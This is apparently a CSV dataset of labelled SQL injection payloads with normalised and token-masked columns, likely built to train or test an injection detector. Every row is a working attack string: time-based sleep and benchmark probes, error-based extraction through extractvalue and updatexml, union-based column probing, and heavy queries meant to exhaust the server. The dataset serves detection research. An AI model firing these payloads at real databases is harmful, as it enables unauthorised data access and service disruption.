payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
1'   )    )    as gfzb where 7904  =  7904,1,sqli_dataset.csv,,False,1' ) ) as gfzb where 7904 = 7904,<NUM>' ) ) as gfzb where <NUM> = <NUM>
"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>
"-9779'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'hmzj'  =  'hmzj",1,sqli_dataset.csv,,False,"-9779' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'hmzj' = 'hmzj",-<NUM><STR>hmzj<STR>hmzj
"1' where 9156  =  9156 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1' where 9156 = 9156 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>' where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'ekhi' = 'ekhi","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) and <STR> = 'ekhi"
"1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sqli_dataset.csv,,True,"1%' ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #","<NUM>%' ) ) procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c, ( benchmark ( <NUM>,md5 ( 0x4b774c75 ) ) ) ) ) ,<NUM> ) #"
-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sqli_dataset.csv,,False,-7430' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,-<NUM>' ) as xfah where <NUM> = <NUM> or <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual ) --
-1648   )    )    as oqqy where 3459  =  3459 or 6872  =  6872--,1,sqli_dataset.csv,,False,-1648 ) ) as oqqy where 3459 = 3459 or 6872 = 6872--,-<NUM> ) ) as oqqy where <NUM> = <NUM> or <NUM> = <NUM>--
"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",1,sqli_dataset.csv,,False,"-7731"" ) ) or make_set ( 2551 = 4389,4389 ) and ( ( ""unly"" like ""unly",-<NUM><STR>unly<STR>unly
"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",1,sqli_dataset.csv,,False,"-5372"" ) as wlqm where 2432 = 2432 union all select 2432,2432,2432,2432,2432,2432#","-<NUM>"" ) as wlqm where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"-9996' or make_set  (  1237  =  7111,7111  )  ",1,sqli_dataset.csv,,False,"-9996' or make_set ( 1237 = 7111,7111 )","-<NUM>' or make_set ( <NUM> = <NUM>,<NUM> )"
select   (  case when   (  4690  =  4373  )   then 4690 else 1/  (  select 0  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 4690 = 4373 ) then 4690 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --
"-6815 where 7609  =  7609 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sqli_dataset.csv,,True,"-6815 where 7609 = 7609 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #","-<NUM> where <NUM> = <NUM> or <NUM> group by concat ( 0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) having min ( <NUM> ) #"
select   (  case when   (  7005  =  7118  )   then 1 else 7005*  (  select 7005 from master..sysdatabases  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 7005 = 7118 ) then 1 else 7005* ( select 7005 from master..sysdatabases ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from master..sysdatabases ) end ) --
"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sqli_dataset.csv,,False,"1 ) ) as xsyk where 2575 = 2575 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM> ) ) as xsyk where <NUM> = <NUM> or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --"
"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1 ) where 7815 = 7815 union all select null,null,null,null,null,null,null#","<NUM> ) where <NUM> = <NUM> union all select null,null,null,null,null,null,null#"
select sleep  (  5  )   and 'eskp' like 'eskp,1,sqli_dataset.csv,,False,select sleep ( 5 ) and 'eskp' like 'eskp,select sleep ( <NUM> ) and <STR> like 'eskp
"1""  )   as advz where 5166  =  5166 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sqli_dataset.csv,,False,"1"" ) as advz where 5166 = 5166 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>"" ) as advz where <NUM> = <NUM> or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --"
"1""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""fogb"" like ""fogb",1,sqli_dataset.csv,,False,"1"" ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""fogb"" like ""fogb",<NUM><STR>fogb<STR>fogb
"1""  )   as vpna where 5450  =  5450 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1"" ) as vpna where 5450 = 5450 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>"" ) as vpna where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,1,sqli_dataset.csv,,False,1' rlike sleep ( 5 ) and 'gtfo' = 'gtfo,<NUM><STR>gtfo<STR>gtfo
-8966%' or   (  7475  =  4014  )  *4014 and '%'  =  ',1,sqli_dataset.csv,,False,-8966%' or ( 7475 = 4014 ) *4014 and '%' = ',-<NUM>%<STR>%<STR>
1  )   as sdnd where 9472  =  9472,1,sqli_dataset.csv,,False,1 ) as sdnd where 9472 = 9472,<NUM> ) as sdnd where <NUM> = <NUM>
1   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  5368  =  5368,1,sqli_dataset.csv,,False,1 ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 5368 = 5368,<NUM> ) ) ) and <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) and ( ( ( <NUM> = <NUM>
"1%"" rlike sleep  (  5  )   and ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" rlike sleep ( 5 ) and ""%"" = """,<NUM>%<STR>%<STR>
"-9944""   )    )    or 8537  =  2039 and    (    (   ""kfzj""  =  ""kfzj",1,sqli_dataset.csv,,False,"-9944"" ) ) or 8537 = 2039 and ( ( ""kfzj"" = ""kfzj",-<NUM><STR>kfzj<STR>kfzj
"1%""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sqli_dataset.csv,,False,"1%"" ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","<NUM>%"" ) and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",1,sqli_dataset.csv,,True,"-3347'+ ( select xuzs where 1076 = 1076 union all select 1076,1076,1076,1076,1076--","-<NUM>'+ ( select xuzs where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'lyem' like 'lyem",1,sqli_dataset.csv,,True,"1' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'lyem' like 'lyem",<NUM><STR>lyem<STR>lyem
"-7764"" or 7308  =  7805",1,sqli_dataset.csv,,False,"-7764"" or 7308 = 7805","-<NUM>"" or <NUM> = <NUM>"
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%' ) ) union all select null,null,null,null,null,null,null,null,null,null--","<NUM>%' ) ) union all select null,null,null,null,null,null,null,null,null,null--"
1' in boolean mode  )   and sleep  (  5  )  #,1,sqli_dataset.csv,,False,1' in boolean mode ) and sleep ( 5 ) #,<NUM>' in boolean mode ) and sleep ( <NUM> ) #
"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",1,sqli_dataset.csv,,False,"-4152"" ) where 9781 = 9781 union all select 9781,9781,9781,9781,9781--","-<NUM>"" ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,sqli_dataset.csv,,True,"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )","<NUM>"" and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) )"
"1%""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sqli_dataset.csv,,False,"1%"" ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>%"" ) or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"-6122""  )   union all select 6578,6578--",1,sqli_dataset.csv,,False,"-6122"" ) union all select 6578,6578--","-<NUM>"" ) union all select <NUM>,<NUM>--"
select   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  select 0  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 5768 = 9169 ) then 5768 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --
"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",1,sqli_dataset.csv,,False,"1' where 9003 = 9003 and make_set ( 5868 = 8316,8316 ) --","<NUM>' where <NUM> = <NUM> and make_set ( <NUM> = <NUM>,<NUM> ) --"
"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse",1,sqli_dataset.csv,,True,"1"" ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""dzse"" = ""dzse",<NUM><STR>dzse<STR>dzse
 (  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ,1,sqli_dataset.csv,,False,( select ( case when ( 8130 = 5894 ) then 8130 else 8130* ( select 8130 from information_schema.character_sets ) end ) ),( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from information_schema.character_sets ) end ) )
select case when 4537  =  8418 then 1 else null end--,1,sqli_dataset.csv,,False,select case when 4537 = 8418 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,1,sqli_dataset.csv,,False,1 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) -- fyaq,<NUM> or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) -- fyaq
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",1,sqli_dataset.csv,,True,"1 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) -- jpqa","<NUM> and ( select <NUM> from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from information_schema.character_sets group by x ) a ) -- jpqa"
"1""  )   where 5298  =  5298 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,sqli_dataset.csv,,False,"1"" ) where 5298 = 5298 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --","<NUM>"" ) where <NUM> = <NUM> and <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) --"
"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",1,sqli_dataset.csv,,False,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#","-<NUM>%"" union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'lqql'  =  'lqql",1,sqli_dataset.csv,,False,"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'lqql' = 'lqql",<NUM><STR>abcdefg<STR>lqql<STR>lqql
"iif  (  3447  =  1084,1,1/0  )  ",1,sqli_dataset.csv,,False,"iif ( 3447 = 1084,1,1/0 )","iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )"
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'vfnl'  =  'vfnl",1,sqli_dataset.csv,,True,"1' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( 'vfnl' = 'vfnl",<NUM><STR>vfnl<STR>vfnl
"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl",1,sqli_dataset.csv,,False,"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'pgyl' = 'pgyl",<NUM><STR>pgyl<STR>pgyl
1'||  (  select 'uedk' where 4655  =  4655,1,sqli_dataset.csv,,False,1'|| ( select 'uedk' where 4655 = 4655,<NUM><STR>uedk' where <NUM> = <NUM>
"1%"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sqli_dataset.csv,,False,"1%"" or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>%"" or <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>' or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
select   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  select 1291 from master..sysdatabases  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 1291 = 6612 ) then 1 else 1291* ( select 1291 from master..sysdatabases ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from master..sysdatabases ) end ) --
-2429%' or 6890  =  5846,1,sqli_dataset.csv,,False,-2429%' or 6890 = 5846,-<NUM>%' or <NUM> = <NUM>
"1%""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""%""  =  """,1,sqli_dataset.csv,,True,"1%"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>
-4761 order by 1--,1,sqli_dataset.csv,,False,-4761 order by 1--,-<NUM> order by <NUM>--
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sqli_dataset.csv,,False,1' or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,<NUM>' or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #
"-4394'   )    )    union all select 3409,3409--",1,sqli_dataset.csv,,False,"-4394' ) ) union all select 3409,3409--","-<NUM>' ) ) union all select <NUM>,<NUM>--"
-2960' or 2163  =  3143--,1,sqli_dataset.csv,,False,-2960' or 2163 = 3143--,-<NUM>' or <NUM> = <NUM>--
1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,1,sqli_dataset.csv,,False,1' ) where 1645 = 1645 rlike sleep ( 5 ) --,<NUM>' ) where <NUM> = <NUM> rlike sleep ( <NUM> ) --
"-6890""   )    )     )   union all select 1115#",1,sqli_dataset.csv,,False,"-6890"" ) ) ) union all select 1115#","-<NUM>"" ) ) ) union all select <NUM>#"
1  )   where 4479  =  4479 rlike   (  select   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,1,sqli_dataset.csv,,True,1 ) where 4479 = 4479 rlike ( select ( case when ( 6351 = 4367 ) then 1 else 0x28 end ) ) --,<NUM> ) where <NUM> = <NUM> rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ) --
"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",1,sqli_dataset.csv,,False,"select * from generate_series ( 2317,2317,case when ( 2317 = 9706 ) then 1 else 0 end ) limit 1--","select * from generate_series ( <NUM>,<NUM>,case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) limit <NUM>--"
"select * from generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   limit 1--",1,sqli_dataset.csv,,False,"select * from generate_series ( 3427,3427,case when ( 3427 = 7516 ) then 1 else 0 end ) limit 1--","select * from generate_series ( <NUM>,<NUM>,case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) limit <NUM>--"
"1"" and elt  (  4249  =  4249,7259  )  ",1,sqli_dataset.csv,,False,"1"" and elt ( 4249 = 4249,7259 )","<NUM>"" and elt ( <NUM> = <NUM>,<NUM> )"
"1'   )    )    as ewyk where 4828  =  4828 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sqli_dataset.csv,,True,"1' ) ) as ewyk where 4828 = 4828 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM>' ) ) as ewyk where <NUM> = <NUM> and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --"
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""%""  =  """,1,sqli_dataset.csv,,False,"select count ( * ) from generate_series ( 1,5000000 ) and ""%"" = ""","select count ( * ) from generate_series ( <NUM>,<NUM> ) and <STR> = """
"-8186%' or elt  (  1032  =  1032,3623  )   and '%'  =  '",1,sqli_dataset.csv,,False,"-8186%' or elt ( 1032 = 1032,3623 ) and '%' = '",-<NUM>%<STR>%<STR>
1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,1,sqli_dataset.csv,,False,1 ) ) rlike sleep ( 5 ) and ( ( 8773 = 8773,<NUM> ) ) rlike sleep ( <NUM> ) and ( ( <NUM> = <NUM>
select case when 7649  =  9297 then 1 else null end--,1,sqli_dataset.csv,,False,select case when 7649 = 9297 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--
